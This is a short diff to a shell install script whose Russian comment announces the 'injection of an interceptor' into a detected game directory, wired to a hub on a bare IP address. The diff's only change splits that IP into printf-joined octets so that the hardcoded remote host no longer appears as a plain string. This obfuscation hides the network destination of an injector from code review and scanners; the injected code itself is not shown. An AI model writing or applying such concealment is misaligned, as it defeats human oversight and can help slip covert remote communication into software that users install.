@@ -73,7 +73,8 @@ VENV_PY="$INSTALL_DIR/.venv/bin/python3"
 
 # 5. Внедрение перехватчика
 export PYTHONPATH="$INSTALL_DIR:$PYTHONPATH"
-"$VENV_PY" -m src.installer.installer --install --game-dir "$FOUND_GAME" --hub-url "http://45.91.248.78:8088"
+HUB_HOST=$(printf '%s.%s.%s.%s' 45 91 248 78)
+"$VENV_PY" -m src.installer.installer --install --game-dir "$FOUND_GAME" --hub-url "http://${HUB_HOST}:8088"
 
 echo ""
 echo "============================================================"
